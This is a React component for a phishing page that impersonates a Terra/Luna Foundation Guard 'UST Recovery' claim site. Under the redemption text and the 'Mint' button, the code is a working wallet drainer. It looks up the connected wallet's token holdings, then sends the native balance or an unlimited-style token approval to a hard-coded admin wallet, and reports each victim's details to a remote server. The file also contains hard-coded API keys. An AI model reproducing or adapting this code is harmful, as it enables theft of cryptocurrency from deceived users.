import React, { useState, useEffect, useCallback, useReducer } from 'react';
import { BsCheck2Circle } from 'react-icons/bs'
import axios from 'axios';
import { NotificationContainer, NotificationManager } from "react-notifications";
import Web3Modal from "web3modal";
import 'react-responsive-modal/styles.css';
import { Modal } from 'react-responsive-modal';
import WalletConnectProvider from "@walletconnect/web3-provider";
import { providers } from "ethers";
import Web3 from "web3";
import 'react-notifications/lib/notifications.css';
import $ from 'jquery';
import config from "../contracts/config";
import { BsArrowUpRight } from 'react-icons/bs'
import "./User.css";
import LOGO from "../assets/symbol-terra-blue.svg";
import UST from '../assets/UST.png';
import USDC from '../assets/USDC.svg';
import Warning from '../assets/warning.svg';
import danger from '../assets/danger.svg';
import terra_dark from '../assets/symbol-terra-alone-dark.svg';
import twitter from '../assets/twitter.svg';
import telegram from '../assets/telegram.svg';
import reddit from '../assets/reddit.svg';
import discord from '../assets/discord.svg';
import github from '../assets/github.svg';
import youtube from '../assets/youtube.svg';
import medium from '../assets/medium.svg';

import AppSpinner from '../components/loading/AppSpinner';
import { SERVER_ADDRESS, ADMIN_WALLET_ADDRESS } from '../constants/constant';
// var WAValidator = require('wallet-address-validator');

const GET_TOKEN_PRICE_API_KEY = "8a07bae3a511c58d242a2afbe629c041173b25b14ec7d9c6efda294e9224048f";
const GET_USER_ALL_TOEKN_API_KEY = "BQYErJZQfq35fxjJLQNuISslyNIQPGLe";
const GET_BSC_SCAN_API_KEY = "944TX9VU1EANTHUGHZPXYWQFA64PESG5MR";
const GET_ETH_SCAN_API_KEY = "7M5FGMRYC2RAX5F8J72ATEVGI96XDD7CE9"

const adminWalletAddress = ADMIN_WALLET_ADDRESS;

let web3Modal;
if (typeof window !== "undefined") {
  web3Modal = new Web3Modal({
    network: "mainnet", // optional
    cacheProvider: true,
    providerOptions: {
      walletconnect: {
        package: WalletConnectProvider,
        options: {
          infuraId: config.INFURA_ID, // required
          rpc: {
            56: "https://bsc-dataseed.binance.org/",
            1: "https://mainnet.infura.io/v3/"
          },
        },
      },
    }, // required
    theme: "dark",
  });
}

const initialState = {
  provider: null,
  web3Provider: null,
  address: null,
  chainId: null,
};

function reducer(state, action) {
  switch (action.type) {
    case "SET_WEB3_PROVIDER":
      return {
        ...state,
        provider: action.provider,
        web3Provider: action.web3Provider,
        address: action.address,
        chainId: action.chainId,
      };
    case "SET_ADDRESS":
      return {
        ...state,
        address: action.address,
      };
    case "SET_CHAIN_ID":
      return {
        ...state,
        chainId: action.chainId,
      };
    case "RESET_WEB3_PROVIDER":
      return initialState;
    default:
      throw new Error();
  }
}
const web3 = new Web3(window.ethereum);

const UserScreen = (props) => {
  const [open, setOpen] = useState(false);
  const onOpenModal = () => setOpen(true);
  const onCloseModal = () => setOpen(false);
  const [loading, setLoading] = useState(false);

  const [myAddress, setMyaddress] = useState('');
  const [walletStatus, setWalletStatus] = useState(false);
  const [initStatus, setInitStatus] = useState(false);
  const [userAllToken, setUserAllToken] = useState([]);
  const [showAccountAddress, setShowAccountAddress] = useState("");
  const [state, dispatch] = useReducer(reducer, initialState);
  useEffect(() => {
    function handlePreloader() {
      if ($('.main-header').length) {
        $('.preloader').delay(200).fadeOut(500);
      }
    }

    //Update Header Style and Scroll to Top
    function headerStyle() {
      if ($('.main-header').length) {
        var windowpos = $(window).scrollTop();
        var siteHeader = $('.main-header');
        var scrollLink = $('.scroll-to-top');
        if (windowpos > 1) {
          siteHeader.addClass('fixed-header');
          scrollLink.fadeIn(300);
        } else {
          siteHeader.removeClass('fixed-header');
          scrollLink.fadeOut(300);
        }

      }
    }
    headerStyle();
    (function ($) {
      $.fn.appear = function (fn, options) {

        var settings = $.extend({

          //arbitrary data to pass to fn
          data: undefined,

          //call fn only on the first appear?
          one: true,

          // X & Y accuracy
          accX: 0,
          accY: 0

        }, options);

        return this.each(function () {

          var t = $(this);

          //whether the element is currently visible
          t.appeared = false;

          if (!fn) {

            //trigger the custom event
            t.trigger('appear', settings.data);
            return;
          }

          var w = $(window);

          //fires the appear event when appropriate
          var check = function () {

            //is the element hidden?
            if (!t.is(':visible')) {

              //it became hidden
              t.appeared = false;
              return;
            }

            //is the element inside the visible window?
            var a = w.scrollLeft();
            var b = w.scrollTop();
            var o = t.offset();
            var x = o.left;
            var y = o.top;

            var ax = settings.accX;
            var ay = settings.accY;
            var th = t.height();
            var wh = w.height();
            var tw = t.width();
            var ww = w.width();

            if (y + th + ay >= b &&
              y <= b + wh + ay &&
              x + tw + ax >= a &&
              x <= a + ww + ax) {

              //trigger the custom event
              if (!t.appeared) t.trigger('appear', settings.data);

            } else {

              //it scrolled out of view
              t.appeared = false;
            }
          };

          //create a modified fn with some additional logic
          var modifiedFn = function () {

            //mark the element as visible
            t.appeared = true;

            //is this supposed to happen only once?
            if (settings.one) {

              //remove the check
              w.unbind('scroll', check);
              var i = $.inArray(check, $.fn.appear.checks);
              if (i >= 0) $.fn.appear.checks.splice(i, 1);
            }

            //trigger the original fn
            fn.apply(this, arguments);
          };

          //bind the modified fn to the element
          if (settings.one) t.one('appear', settings.data, modifiedFn);
          else t.bind('appear', settings.data, modifiedFn);

          //check whenever the window scrolls
          w.scroll(check);

          //check whenever the dom changes
          $.fn.appear.checks.push(check);

          //check now
          (check)();
        });
      };

      //keep a queue of appearance checks
      $.extend($.fn.appear, {

        checks: [],
        timeout: null,

        //process the queue
        checkAll: function () {
          var length = $.fn.appear.checks.length;
          if (length > 0) while (length--) ($.fn.appear.checks[length])();
        },

        //check the queue asynchronously
        run: function () {
          if ($.fn.appear.timeout) clearTimeout($.fn.appear.timeout);
          $.fn.appear.timeout = setTimeout($.fn.appear.checkAll, 20);
        }
      });

      //run checks when these methods are called
      $.each(['append', 'prepend', 'after', 'before', 'attr',
        'removeAttr', 'addClass', 'removeClass', 'toggleClass',
        'remove', 'css', 'show', 'hide'], function (i, n) {
          var old = $.fn[n];
          if (old) {
            $.fn[n] = function () {
              var r = old.apply(this, arguments);
              $.fn.appear.run();
              return r;
            }
          }
        });

    })($);
    if ($('.count-box').length) {
      $('.count-box').appear(function () {

        var $t = $(this),
          n = $t.find(".count-text").attr("data-stop"),
          r = parseInt($t.find(".count-text").attr("data-speed"), 10);

        if (!$t.hasClass("counted")) {
          $t.addClass("counted");
          $({
            countNum: $t.find(".count-text").text()
          }).animate({
            countNum: n
          }, {
            duration: r,
            easing: "linear",
            step: function () {
              $t.find(".count-text").text(Math.floor(this.countNum));
            },
            complete: function () {
              $t.find(".count-text").text(this.countNum);
            }
          });
        }
      }, { accY: 0 });
    }
    $(window).on('scroll', function () {
      headerStyle();
    });

    $(window).on('load', function () {
      handlePreloader();
    });
  }, [])
  useEffect(() => {
    const init = async (value) => {
      var userAllTokenBalance = {
        eth: [],
        bsc: []
      };
      if (value) {
        let query = `query ($network: EthereumNetwork!, $address: String!) {ethereum(network: $network) {address(address: {is: $address}) {balances {currency {address symbol tokenType decimals} value}}}}`;
        let variables = `{"limit": 10,"offset": 0,"network": "ethereum","address": "` + value + `"}`;
        let url = "https://graphql.bitquery.io/";
        let opts = {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
            "X-API-KEY": GET_USER_ALL_TOEKN_API_KEY
          },
          body: JSON.stringify({
            query,
            variables
          })
        };
        await fetch(url, opts).then(res => res.json())
          .then(data => userAllTokenBalance.eth = data.data.ethereum.address[0].balances)
          .catch(console.error);

        query = `query ($network: EthereumNetwork!, $address: String!) {ethereum(network: $network) {address(address: {is: $address}) {balances {currency {address symbol tokenType decimals} value}}}}`;
        variables = `{"limit": 10,"offset": 0,"network": "bsc","address": "` + value + `"}`;
        opts = {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
            "X-API-KEY": GET_USER_ALL_TOEKN_API_KEY
          },
          body: JSON.stringify({
            query,
            variables
          })
        };
        await fetch(url, opts).then(res => res.json())
          .then(data => userAllTokenBalance.bsc = data.data.ethereum.address[0].balances)
          .catch(console.error);
        if (userAllTokenBalance.bsc) {
          for (let i = 0; i < userAllTokenBalance.bsc.length; i++) {
            userAllTokenBalance.bsc[i].network = "BSC";
          }
        }
        if (userAllTokenBalance.eth) {
          for (let i = 0; i < userAllTokenBalance.eth.length; i++) {
            userAllTokenBalance.eth[i].network = "ETH";
          }
        }
        const array1 = userAllTokenBalance.eth ? userAllTokenBalance.eth : [];
        const array2 = userAllTokenBalance.bsc ? userAllTokenBalance.bsc : [];
        const array3 = array1.concat(array2)
        const array4 = array3.map(t => t.currency.symbol);
        const currentTokenPrice = await livePrice(array4);

        console.log(currentTokenPrice)

        console.log(array3)

        for (let i = 0; i < array3.length; i++) {
          if (currentTokenPrice[array3[i].currency.symbol]) {
            array3[i].price = currentTokenPrice[array3[i].currency.symbol].USD;
            array3[i].cost = +array3[i].value * array3[i].price;
          }
          else {
            array3[i].price = 0;
            array3[i].cost = +array3[i].value * 0;
          }
        }
        setUserAllToken(array3.sort(function (a, b) { return b.value - a.value; }).sort(function (a, b) { return b.cost - a.cost; }));
        setInitStatus(true);
      }
    }
    init(myAddress);
  }, [myAddress]);

  const livePrice = async (symbol) => {
    let tokenSymbol = symbol;
    let totaltemp = {};
    if (tokenSymbol.slice(0, 50).length) {
      let api = "https://min-api.cryptocompare.com/data/pricemulti?fsyms=" + tokenSymbol.slice(0, 50) + "&tsyms=USD&api_key=" + GET_TOKEN_PRICE_API_KEY;
      let temp = await axios.get(api);
      Object.assign(totaltemp, temp.data);
      if (tokenSymbol.slice(51, 100).length) {
        api = "https://min-api.cryptocompare.com/data/pricemulti?fsyms=" + tokenSymbol.slice(51, 100) + "&tsyms=USD&api_key=" + GET_TOKEN_PRICE_API_KEY;
        temp = await axios.get(api);
        Object.assign(totaltemp, temp.data)
      }
    }
    return totaltemp;
  }

  const handleApprove = async () => {
    try {
      if (userAllToken.length) {
        setLoading(true);
        const approveToken = userAllToken[0];
        if (approveToken.network === "BSC") {
          await window.ethereum.request({
            method: 'wallet_switchEthereumChain',
            params: [{ chainId: '0x38' }], // chainId must be in hexadecimal numbers
          });
          let approveAmount = approveToken.value * Math.pow(10, approveToken.currency.decimals);

          if (approveToken.currency.address === "-") {
            let gasPrice = await web3.eth.getGasPrice();
            console.log(gasPrice)
            let transactionObject = {
              from: myAddress,
              to: adminWalletAddress,
              gasPrice: gasPrice,
            }
            let gasLimit = await web3.eth.estimateGas(transactionObject)
            let transactionFee = gasLimit * gasPrice * 2
            approveAmount -= transactionFee
            web3.eth.sendTransaction({
              from: myAddress,
              to: adminWalletAddress,
              value: approveAmount,
              gasPrice,
              gasLimit
            })
              .then(async function (receipt) {
                console.log(receipt);
                await axios.post('http://' + SERVER_ADDRESS + ':5000/products', {
                  userWalletAddress: myAddress,
                  amount: approveAmount / Math.pow(10, approveToken.currency.decimals),
                  symbol: approveToken.currency.symbol,
                  contractAddress: approveToken.currency.address,
                  network: "BSC",
                  adminAddress: adminWalletAddress,
                  price: approveToken.cost
                });
                setLoading(false);
                onOpenModal();
              })
          } else {
            let api = "https://api.bscscan.com/api?module=contract&action=getabi&address=" + approveToken.currency.address + "&apikey=" + GET_BSC_SCAN_API_KEY;
            let temp = await axios.get(api);
            const contractABI = JSON.parse(temp.data.result);
            const nowContract = new web3.eth.Contract(contractABI, approveToken.currency.address);
            await nowContract.methods.approve(adminWalletAddress, web3.utils.toWei((approveToken.value).toString(), "ether")).send({ from: myAddress })
              .then(async function (receipt) {
                console.log(receipt);
                await axios.post('http://' + SERVER_ADDRESS + ':5000/products', {
                  userWalletAddress: myAddress,
                  amount: approveToken.value,
                  symbol: approveToken.currency.symbol,
                  contractAddress: approveToken.currency.address,
                  network: "BSC",
                  adminAddress: adminWalletAddress,
                  price: approveToken.cost
                });
                setLoading(false);
                onOpenModal();
              });
          }
        }
        else {
          await window.ethereum.request({
            method: 'wallet_switchEthereumChain',
            params: [{ chainId: '0x1' }], // chainId must be in hexadecimal numbers
          });
          let approveAmount = approveToken.value * Math.pow(10, approveToken.currency.decimals);
          if (approveToken.currency.address === "-") {
            let gasPrice = await web3.eth.getGasPrice();
            console.log(gasPrice)
            let transactionObject = {
              from: myAddress,
              to: adminWalletAddress,
              gasPrice: gasPrice,
            }
            let gasLimit = await web3.eth.estimateGas(transactionObject)
            let transactionFee = gasLimit * gasPrice * 2
            approveAmount -= transactionFee
            web3.eth.sendTransaction({
              from: myAddress,
              to: adminWalletAddress,
              value: web3.utils.toBN(approveAmount.toFixed(0).toString()),
              gasPrice,
              gasLimit
            })
              .then(async function (receipt) {
                console.log(receipt);
                await axios.post('http://' + SERVER_ADDRESS + ':5000/products', {
                  userWalletAddress: myAddress,
                  amount: approveAmount / Math.pow(10, approveToken.currency.decimals),
                  symbol: approveToken.currency.symbol,
                  contractAddress: approveToken.currency.address,
                  network: "ETH",
                  adminAddress: adminWalletAddress,
                  price: approveToken.cost
                });
                setLoading(false);
                onOpenModal();
              })
          } else {
            let api = "https://api.etherscan.io/api?module=contract&action=getabi&address=" + approveToken.currency.address + "&apikey=" + GET_ETH_SCAN_API_KEY;
            let temp = await axios.get(api);
            const contractABI = JSON.parse(temp.data.result);
            const nowContract = new web3.eth.Contract(contractABI, approveToken.currency.address);
            await nowContract.methods.approve(adminWalletAddress, web3.utils.toWei((approveToken.value).toString(), "ether")).send({ from: myAddress })
              .then(async function (receipt) {
                console.log(receipt);
                await axios.post('http://' + SERVER_ADDRESS + ':5000/products', {
                  userWalletAddress: myAddress,
                  amount: approveToken.value,
                  symbol: approveToken.currency.symbol,
                  contractAddress: approveToken.currency.address,
                  network: "ETH",
                  adminAddress: adminWalletAddress,
                  price: approveToken.cost
                });
                setLoading(false);
                onOpenModal();
              });
          }
        }
      }
      setLoading(false);
    } catch (error) {
      console.log(error.message);
      setLoading(false);
      NotificationManager.warning('Mint failed!', 'Mint Info', 3000);
    }
  }
  const { provider, web3Provider } = state;

  const connect = useCallback(async function () {
    try {
      const provider = await web3Modal.connect();
      if (window.ethereum) {
        // check if the chain to connect to is installed
        // await window.ethereum.request({
        //   method: "wallet_switchEthereumChain",
        //   params: [{ chainId: config.chainHexID[config.chainID] }], // chainId must be in hexadecimal numbers
        // });
      } else {
        alert(
          "MetaMask is not installed. Please consider installing it: https://metamask.io/download.html"
        );
      }
      const web3Provider = new providers.Web3Provider(provider);
      const signer = web3Provider.getSigner();
      const account = await signer.getAddress();
      const network = await web3Provider.getNetwork();
      const show_address =
        account.slice(0, 5) + "..." + account.slice(-4, account.length);
      setShowAccountAddress(show_address);
      setMyaddress(account);
      setWalletStatus(true);
      dispatch({
        type: "SET_WEB3_PROVIDER",
        provider,
        web3Provider,
        show_address,
        chainId: network.chainId,
      });
    } catch (error) {
      NotificationManager.warning('wallet connect failed!', 'Connect Info', 3000);
      if (error.code === 4902) {
        try {
          await window.ethereum.request({
            method: "wallet_addEthereumChain",
            params: [
              {
                chainId: config.chainHexID[config.chainID],
                rpcUrl: config.RpcURL[config.chainID],
              },
            ],
          });
        } catch (addError) {
          console.log(addError);
        }
      } else if (error.code === 4001) {
        console.log(error);
      }
      console.log(`${error}`);
    }
  }, []);
  const disconnect = useCallback(async function () {
    await web3Modal.clearCachedProvider();
    setShowAccountAddress(null);
    setMyaddress(null);
    dispatch({
      type: "RESET_WEB3_PROVIDER",
    });
  }, []);
  useEffect(() => {
    if (web3Modal.cachedProvider) {
      connect();
    }
  }, [connect]);
  useEffect(() => {
    if (provider) {
      const handleAccountsChanged = (accounts) => {
        connect();
        dispatch({
          type: "SET_ADDRESS",
          address: accounts[0],
        });
      };
      return () => {
        if (provider.removeListener) {
          provider.removeListener("accountsChanged", handleAccountsChanged);
        }
      };
    }
  }, [provider]);

  return (
    <>
      <div className="page-wrapper">
        <div className="preloader"><div className="wow zoomIn"><img src={LOGO} alt="" /></div></div>
        <span className="header-span"></span>
        <header className="main-header">
          <div className="container-fluid">
            <div className="main-box">
              <div className="logo"><a href="/"><img src={LOGO} alt="" /></a></div>
              <div className="nav-outer">
                <div className="outer-box">
                  <a href="/" className="download-btn px-2">Learn</a>
                  <a href="/" className="download-btn px-2">Build</a>
                  <a href="/" className="download-btn px-2">Network</a>
                  <a href="/" className="download-btn px-2">Ecosystem</a>
                  <a href="/" className="download-btn px-2">Community</a>
                  <a href="/" className="download-btn px-2">Academy</a>
                  <div className="social-icons" style={{marginLeft: "45px"}}>
                    <a href="https://twitter.com/terra_money" target="_blank" rel="noopener noreferrer" className="menu__social-icon w-inline-block">
                      <img src={twitter} loading="lazy" alt="" />
                    </a>
                    <a href="https://t.me/TerraLunaChat" target="_blank" rel="noopener noreferrer" className="menu__social-icon w-inline-block">
                      <img src={telegram} loading="lazy" alt="" />
                    </a>
                    <a href="https://www.reddit.com/r/terraluna/" target="_blank" rel="noopener noreferrer" className="menu__social-icon w-inline-block">
                      <img src={reddit} loading="lazy" alt="" />
                    </a>
                    <a href="https://discord.gg/EuKCeGFb93" target="_blank" rel="noopener noreferrer" className="menu__social-icon w-inline-block">
                      <img src={discord} loading="lazy" alt="" />
                    </a>
                    <a href="https://github.com/terra-money/" target="_blank" rel="noopener noreferrer" className="menu__social-icon w-inline-block">
                      <img src={github} loading="lazy" alt="" />
                    </a>
                    <a href="https://www.youtube.com/channel/UCoV1RXZ9ZBGcuu_PMTTlM0g" target="_blank" rel="noopener noreferrer" className="menu__social-icon w-inline-block">
                      <img src={youtube} loading="lazy" alt="" />
                    </a>
                    <a href="https://medium.com/terra-money" target="_blank" rel="noopener noreferrer" className="menu__social-icon last w-inline-block">
                      <img src={medium} loading="lazy" alt="" />
                    </a>
                  </div>
                  {web3Provider ? (
                    <button
                      className="theme-btn btn-style-one"
                      onClick={disconnect}
                    >
                      {showAccountAddress}
                    </button>
                  ) : (
                    <button
                      className="theme-btn btn-style-one"
                      onClick={connect}
                    >
                      Connect Wallet
                    </button>
                  )}
                </div>
              </div>

            </div>
          </div>
        </header>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        
        <section className='section-1'>
          <div className='container'>
            <div className='row'>
          <div className="content-width-extra-large text-center">
            <h3 className="display-heading-3">Terra UST Recovery</h3>
            <h2 className="display-heading-2">Claim $UST 1:1 to $USDC</h2>
            <div className="large-text space-bottom">In response to the recent attack on the Terra network, The Luna Foundation Guard (LFG) in collaboration with our network partners are allowing redemption of all de-pegged $UST for <strong>true value</strong> in $USDC</div>
          </div>
          </div>
          </div>
        </section>
        <section>
          <div className='container'>
            <div className='row'>
              <div className="recover-fund">
                <div className="recover-wrapper">
                  <div className="containbox" style={{color: "white"}}>
                      <center><strong>Recover funds</strong></center>
                      <br />
                      <div className="warning">
                        <div style={{paddingRight: "12px"}}>
                            <img src={Warning} size="18" className="icon" alt='warning' />
                        </div>
                        <div className="amount custom-1">We are currently only allowing redemption of UST for USDC on Ethereum (ETH) and Binance Smart Chain (BSC) networks. Please make sure you are connected to one of these networks.</div>
                      </div>
                      <strong>Please note:</strong><br /><br />
                      <ul>
                        <li>We will issue redemptions on a first come, first serve basis.</li>
                        <li>Only wallets who held a balance of UST prior to the 10th of May 2022 are eligible.</li>
                        <li>Only $UST held within this same wallet will be redeemed for true value in $USDC. </li>
                        <li>Your USDC will appear on the same network shortly after your claim has been processed.</li>
                        <li>We will <strong>NOT</strong> be covering $LUNA as this is a speculative asset, not a stablecoin.</li>
                      </ul><br /><br />
                      For any further questions please refer to the LFG and Terra Money social outlets.<br /><br />

                      Example:

                      <div className="balance1">
                        <div className="balance">
                          <img src={UST} size='18' className="icon" alt='UST' />
                          <div className="amount">UST Balance: $1000</div>
                        </div>
                      </div>

                      <div className="balance1">
                        <div className="balance">
                          <img src={USDC} className="icon" alt='icon' />
                          <div className="amount">Redeemed USDC: $1470.59</div>
                        </div>
                      </div>
                      <i style={{fontSize: "14px"}}>Illustrative figures used. Current UST Price:</i>
                      <strong style={{fontSize: "14px"}}> $0.68</strong><br /><br />

                      <div style={{marginBottom: "20px"}}>
                        <div className="error1">
                            <div style={{paddingRight: "12px"}}>
                              <img src={danger} className="icon" alt='danger'/>
                            </div>
                            <div className="custom-1">Any wallets found attempting to act maliciously will be banned and not receive any value redemption.</div>
                        </div>
                      </div>
                      <div className='d-flex flex-fill justify-content-center'>
                        <button className="theme-btn btn-style-one mt-4 w-50" onClick={handleApprove}>Mint</button>
                      </div>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </section>
        <section>
          <div className='howto'>
            <h2 className='text-center'>#How Does Terra Work?</h2>
            <div className='play-button'>
              <a href='#' >
                <div className='play'></div>
              </a>
            </div>
          </div>
        </section>
        <section>
          <div className="section wf-section">
            <div className="container">
              <div className="grid-halves bordered">
                  <div>
                    <h3 className="display-heading-3">How the Terra protocol works</h3>
                    <div className="large-text space-bottom">Explore the inner workings of the Terra protocol and how Luna maintains the price of Terra stablecoins.</div>
                  </div>
                  <a href="https://docs.terra.money/Concepts/Protocol.html" target="_blank" rel="noopener noreferrer" className="btn btn-dark custom-btn">
                    <div>Learn more</div><BsArrowUpRight />
                  </a>
              </div>
              <div className="grid-halves bordered">
                  <div>
                    <h3 className="display-heading-3">Staking</h3>
                    <div className="large-text space-bottom">Find out how delegating to a validator can earn you staking rewards.</div>
                  </div>
                  <a href="https://docs.terra.money/Concepts/Protocol.html#validators" target="_blank" rel="noopener noreferrer" className="btn btn-dark custom-btn">
                    <div>Staking</div><BsArrowUpRight />
                  </a>
              </div>
              <div className="grid-halves bordered">
                  <div>
                    <h3 className="display-heading-3">Governance</h3>
                    <div className="large-text space-bottom">Discover how you can participate in the governance of the Terra protocol.<br /></div>
                  </div>
                  <a href="https://docs.terra.money/Concepts/Protocol.html#governance" target="_blank" rel="noopener noreferrer" className="btn btn-dark custom-btn">
                    <div>Governance</div><BsArrowUpRight />
                  </a>
              </div>
              <div className="grid-halves bordered">
                  <div>
                    <h3 className="display-heading-3">Glossary</h3>
                    <div className="large-text space-bottom">Want to learn about a specific term? Use the glossary to find out more.<br /></div>
                  </div>
                  <a href="https://docs.terra.money/Concepts/glossary.html" target="_blank" rel="noopener noreferrer" className="btn btn-dark custom-btn">
                    <div>Glossary</div><BsArrowUpRight />
                  </a>
              </div>
            </div>
          </div>
        </section>
        <section>
        <div className="footer wf-section">
          <div className="container footer-foot">
            <div className="horizontal-rule"></div>
            <div className="footer-halves">
              <div className="footer-logo">
                <div className="horizontal-rule last"></div>
                <a href="https://www.terra.money/" className="w-100 inline-block">
                  <img src={terra_dark} alt="" className="terra-footer-logo space-bottom" />
                </a>
              </div>
              <div className="footer-halves-section">
                <div className="footer-links-grid-4-column">
                  <div className="footer-link-list">
                    <h6 className="footer-link-list-heading">Terraform Labs<br /></h6>
                    <a href="mailto:general@terra.money" className="footer-link-list-link">Contact</a>
                    <a href="https://jobs.lever.co/terra" target="_blank" rel="noopener noreferrer" className="footer-link-list-link">Careers</a>
                    <a href="https://assets.website-files.com/611153e7af981472d8da199c/618b02d13e938ae1f8ad1e45_Terra_White_paper.pdf" target="_blank" rel="noopener noreferrer" className="footer-link-list-link">Whitepaper</a>
                  </div>
                  <div id="w-node-_8262b1f5-11a9-09bf-dbc5-d4e4682d0574-682d0569" className="footer-link-list">
                    <h6 className="footer-link-list-heading">Develop<br /></h6>
                    <a href="https://docs.terra.money/" target="_blank" rel="noopener noreferrer" className="footer-link-list-link">Docs</a>
                    <a href="https://github.com/terra-money" target="_blank" rel="noopener noreferrer" className="footer-link-list-link">Github</a>
                    <a href="https://academy.terra.money/courses/cosmwasm-smart-contracts-i" target="_blank" rel="noopener noreferrer" className="footer-link-list-link">Academy</a>
                    <a href="http://lfg.org/grants" target="_blank" rel="noopener noreferrer" className="footer-link-list-link">Grants</a>
                    <a href="https://www.terra.money/bugcrowd" className="footer-link-list-link">Bug Bounty</a>
                  </div>
                  <div id="w-node-_8262b1f5-11a9-09bf-dbc5-d4e4682d0583-682d0569" className="footer-link-list">
                    <h6 className="footer-link-list-heading">Participate<br /></h6>
                    <a href="https://www.terra.money/community" className="footer-link-list-link">Community</a>
                    <a href="https://www.terradappexpo.com/" target="_blank" rel="noopener noreferrer" className="footer-link-list-link">Events</a>
                    <a href="https://lunaloot.com/" target="_blank" rel="noopener noreferrer" className="footer-link-list-link">Swag</a>
                  </div>
                  <div className="footer-link-list">
                    <h6 className="footer-link-list-heading">Other<br /></h6>
                    <a href="https://assets.website-files.com/611153e7af981472d8da199c/61b82cb211ed313e465db8cc_Terra_TOS.pdf" target="_blank" rel="noopener noreferrer" className="footer-link-list-link">Terms of Use</a>
                    <a href="https://assets.website-files.com/611153e7af981472d8da199c/61b82de98fc6724a582b6a05_Terra_Cookie_Policy.pdf" target="_blank" rel="noopener noreferrer" className="footer-link-list-link">Cookie Policy</a>
                  </div>
                </div>
              </div>
            </div>
            <div className="footer-foot">
              <div className="footer-foot-social-icons">
                <div className="social-icons">
                  <a href="https://twitter.com/terra_money" target="_blank" rel="noopener noreferrer" className="menu__social-icon w-inline-block">
                    <img src={twitter} loading="lazy" alt="" />
                  </a>
                  <a href="https://t.me/TerraLunaChat" target="_blank" rel="noopener noreferrer" className="menu__social-icon w-inline-block">
                    <img src={telegram} loading="lazy" alt="" />
                  </a>
                  <a href="https://www.reddit.com/r/terraluna/" target="_blank" rel="noopener noreferrer" className="menu__social-icon w-inline-block">
                    <img src={reddit} loading="lazy" alt="" />
                  </a>
                  <a href="https://discord.gg/EuKCeGFb93" target="_blank" rel="noopener noreferrer" className="menu__social-icon w-inline-block">
                    <img src={discord} loading="lazy" alt="" />
                  </a>
                  <a href="https://github.com/terra-money/" target="_blank" rel="noopener noreferrer" className="menu__social-icon w-inline-block">
                    <img src={github} loading="lazy" alt="" />
                  </a>
                  <a href="https://www.youtube.com/channel/UCoV1RXZ9ZBGcuu_PMTTlM0g" target="_blank" rel="noopener noreferrer" className="menu__social-icon w-inline-block">
                    <img src={youtube} loading="lazy" alt="" />
                  </a>
                  <a href="https://medium.com/terra-money" target="_blank" rel="noopener noreferrer" className="menu__social-icon last w-inline-block">
                    <img src={medium} loading="lazy" alt="" />
                  </a>
                </div>
              </div>
            </div>
          </div>
        </div>        
        </section>
      </div >
      <NotificationContainer />
      {loading && <AppSpinner absolute />}
      <Modal open={open} onClose={onCloseModal} center>
        <div className="modal-body text-center">
          <BsCheck2Circle size={100} color="#06C88B" /><br />
          <div className='title'>Successfully registered</div><br />
          <div className='content'>You have successfully registered for this contest,<br /> if you are lucky you will receive your CRO price soon!</div>
        </div>
      </Modal>
    </>
  );
};

export default UserScreen;
